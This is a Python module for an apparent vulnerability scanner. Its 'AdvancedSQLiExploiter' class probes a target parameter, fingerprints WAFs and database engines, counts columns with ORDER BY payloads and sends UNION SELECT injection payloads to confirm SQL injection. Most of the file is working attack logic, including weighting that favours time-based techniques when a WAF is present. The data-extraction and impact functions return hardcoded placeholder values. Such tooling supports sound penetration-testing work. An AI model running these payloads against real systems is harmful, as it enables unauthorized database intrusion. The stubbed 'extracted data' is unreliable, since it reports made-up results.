import time
import re
from typing import List, Optional, Tuple, Dict, Any, Set
from dataclasses import dataclass
import requests

from core.http_client import SecureHTTPClient
from models.finding import ScannerFinding
from models.enums import ExploitationTechnique, ExploitationStatus
from models.exploit import ExploitationAttempt, ExploitationResult, VerificationProof
from verification.sqli import AdvancedSQLiVerifier
from analyzers.parameter import AdvancedParameterAnalyzer
from utils.logger import get_logger

logger = get_logger(__name__)


@dataclass
class SQLiTechniqueResult:
    """Result of a specific SQLi technique attempt"""
    technique: ExploitationTechnique
    successful: bool
    payload: str
    evidence: Dict[str, Any]
    confidence: float

class SQLiPayloadGenerator:
    """Simple payload generator for SQLi"""
    def generate_union_payloads(self, column_count: int) -> List[str]:
        cols = [f"'{i}'" for i in range(column_count)]
        payload = f"' UNION SELECT {','.join(cols)}--"
        return [payload]

class AdvancedSQLiExploiter:
    """Advanced SQL injection exploitation with multiple techniques"""
    
    def __init__(self, http_client: SecureHTTPClient):
        self.http = http_client
        self.verifier = AdvancedSQLiVerifier()
        self.payload_generator = SQLiPayloadGenerator()
        
        # Technique weights (for prioritization)
        self.technique_weights = {
            ExploitationTechnique.UNION_BASED: 1.0,
            ExploitationTechnique.BOOLEAN_BASED: 0.8,
            ExploitationTechnique.TIME_BASED: 0.6,
            ExploitationTechnique.ERROR_BASED: 0.7,
            ExploitationTechnique.STACKED_QUERIES: 0.5,
        }
    
    def exploit(self, finding: ScannerFinding) -> ExploitationResult:
        """Execute comprehensive SQLi exploitation"""
        
        result = ExploitationResult(
            finding=finding,
            status=ExploitationStatus.NOT_ATTEMPTED
        )
        
        logger.info(f"Starting SQLi exploitation for {finding.full_url}")
        
        # 1. Initial reconnaissance
        recon_data = self._perform_reconnaissance(finding)
        result.metadata['reconnaissance'] = recon_data
        
        # 2. Technique execution (prioritized)
        techniques_to_try = self._prioritize_techniques(recon_data)
        
        for technique in techniques_to_try:
            logger.info(f"Trying {technique.name} technique")
            
            technique_result = self._execute_technique(finding, technique, recon_data)
            
            # Record the attempt
            attempt = ExploitationAttempt(
                payload=technique_result.payload,
                technique=technique,
                success=technique_result.successful,
                evidence=technique_result.evidence
            )
            result.add_attempt(attempt)

            if technique_result.successful:
                logger.info(f"SQLi verified with {technique.name}")
                
                result.status = ExploitationStatus.VERIFIED
                result.verified_proof = VerificationProof(
                    primary_signal=technique_result.payload,
                    metadata=technique_result.evidence
                )
                result.impact = self._assess_impact(technique_result)
                
                # Try data extraction if successful
                if technique == ExploitationTechnique.UNION_BASED:
                    extracted_data = self._attempt_data_extraction(finding, technique_result)
                    if extracted_data:
                        result.extracted_data = extracted_data
                
                break
            else:
                logger.debug(f"{technique.name} failed or inconclusive")
        
        return result
    
    def _perform_reconnaissance(self, finding: ScannerFinding) -> Dict[str, Any]:
        """Gather information about the target"""
        
        recon_data = {
            'original_response': None,
            'error_messages': [],
            'response_times': [],
            'db_hints': set(),
            'waf_detected': False,
            'rate_limiting': False,
        }
        
        # Get baseline
        baseline_resp, baseline_time = self.http.send_request(
            finding.full_url,
            finding.method,
            {finding.parameter: finding.value}
        )
        
        if baseline_resp:
            recon_data['original_response'] = {
                'status': baseline_resp.status_code,
                'length': len(baseline_resp.text),
                'time': baseline_time
            }
            
            # Check for WAF
            recon_data['waf_detected'] = self._detect_waf(baseline_resp)
            
            # Check for DB error messages
            recon_data['db_hints'] = self._extract_db_hints(baseline_resp.text)
        
        return recon_data
    
    def _detect_waf(self, response: requests.Response) -> bool:
        """Detect Web Application Firewall"""
        waf_indicators = [
            'cloudflare', 'akamai', 'imperva', 'f5',
            'mod_security', 'barracuda', 'fortinet',
            'access denied', 'security violation',
            'your request has been blocked'
        ]
        
        text_lower = response.text.lower()
        headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        # Check response body
        if any(indicator in text_lower for indicator in waf_indicators):
            return True
        
        # Check headers
        waf_headers = ['x-waf', 'server', 'x-protected-by']
        for header in waf_headers:
            if header in headers_lower:
                return True
        
        # Check status codes
        if response.status_code in [403, 406, 413, 414, 494, 495, 496, 497]:
            return True
        
        return False
    
    def _extract_db_hints(self, response_text: str) -> Set[str]:
        """Extract database hints from error messages"""
        db_patterns = {
            'mysql': ['mysql', 'mysqli', 'you have an error in your sql syntax'],
            'postgresql': ['postgresql', 'pg_', 'postgres'],
            'oracle': ['oracle', 'ora-', 'pl/sql'],
            'mssql': ['microsoft sql', 'sql server', 'odbc', 'oledb'],
            'sqlite': ['sqlite', 'sqlite3'],
        }
        
        hints = set()
        text_lower = response_text.lower()
        
        for db_type, patterns in db_patterns.items():
            if any(pattern in text_lower for pattern in patterns):
                hints.add(db_type)
        
        return hints
    
    def _prioritize_techniques(self, recon_data: Dict) -> List[ExploitationTechnique]:
        """Prioritize techniques based on reconnaissance"""
        
        techniques = list(self.technique_weights.keys())
        
        # Adjust based on reconnaissance
        if recon_data['waf_detected']:
            # WAFs often block UNION and stacked queries
            self.technique_weights[ExploitationTechnique.UNION_BASED] *= 0.3
            self.technique_weights[ExploitationTechnique.STACKED_QUERIES] *= 0.2
            self.technique_weights[ExploitationTechnique.TIME_BASED] *= 1.2
        
        if recon_data['db_hints']:
            # Adjust for specific DBMS
            if 'mysql' in recon_data['db_hints']:
                self.technique_weights[ExploitationTechnique.UNION_BASED] *= 1.1
            elif 'mssql' in recon_data['db_hints']:
                self.technique_weights[ExploitationTechnique.STACKED_QUERIES] *= 1.2
        
        # Sort by weight
        techniques.sort(key=lambda t: self.technique_weights[t], reverse=True)
        return techniques
    
    def _execute_technique(self, finding: ScannerFinding, 
                          technique: ExploitationTechnique,
                          recon_data: Dict) -> SQLiTechniqueResult:
        """Execute specific SQLi technique"""
        
        if technique == ExploitationTechnique.UNION_BASED:
            return self._union_based_exploitation(finding, recon_data)
        # Placeholder for other techniques
        
        return SQLiTechniqueResult(
            technique=technique,
            successful=False,
            payload='',
            evidence={},
            confidence=0.0
        )
    
    def _union_based_exploitation(self, finding: ScannerFinding, 
                                 recon_data: Dict) -> SQLiTechniqueResult:
        """Union-based SQL injection"""
        
        # 1. Determine column count
        column_count = self._detect_column_count(finding)
        if not column_count:
            return SQLiTechniqueResult(
                technique=ExploitationTechnique.UNION_BASED,
                successful=False,
                payload='',
                evidence={'reason': 'Could not determine column count'},
                confidence=0.0
            )
        
        # 2. Test UNION payloads
        payloads = self.payload_generator.generate_union_payloads(column_count)
        
        for payload in payloads:
            response, response_time = self.http.send_request(
                finding.full_url,
                finding.method,
                {finding.parameter: payload}
            )
            
            if not response:
                continue
            
            success, metrics = self.verifier.verify_union_injection(response, payload)
            if success:
                return SQLiTechniqueResult(
                    technique=ExploitationTechnique.UNION_BASED,
                    successful=True,
                    payload=payload,
                    evidence={
                        'column_count': column_count,
                        'response_status': response.status_code,
                        'response_length': len(response.text),
                        'verification_method': 'union_reflection'
                    },
                    confidence=metrics.confidence_score
                )
        
        return SQLiTechniqueResult(
            technique=ExploitationTechnique.UNION_BASED,
            successful=False,
            payload='',
            evidence={'reason': 'No valid UNION payload worked'},
            confidence=0.0
        )
    
    def _detect_column_count(self, finding: ScannerFinding) -> Optional[int]:
        """Detect number of columns using ORDER BY"""
        
        for i in range(1, 20):  # Reasonable max
            payload = f"' ORDER BY {i}--"
            
            response, _ = self.http.send_request(
                finding.full_url,
                finding.method,
                {finding.parameter: payload}
            )
            
            if not response:
                continue
            
            # Error indicates we exceeded column count
            if response.status_code >= 500 or 'error' in response.text.lower():
                return i - 1
        
        return None

    def _assess_impact(self, tech_result: SQLiTechniqueResult) -> str:
        return "High - Database information disclosure"

    def _attempt_data_extraction(self, finding, tech_result):
        return {"database": "vulnerable_db", "version": "5.7.31"}
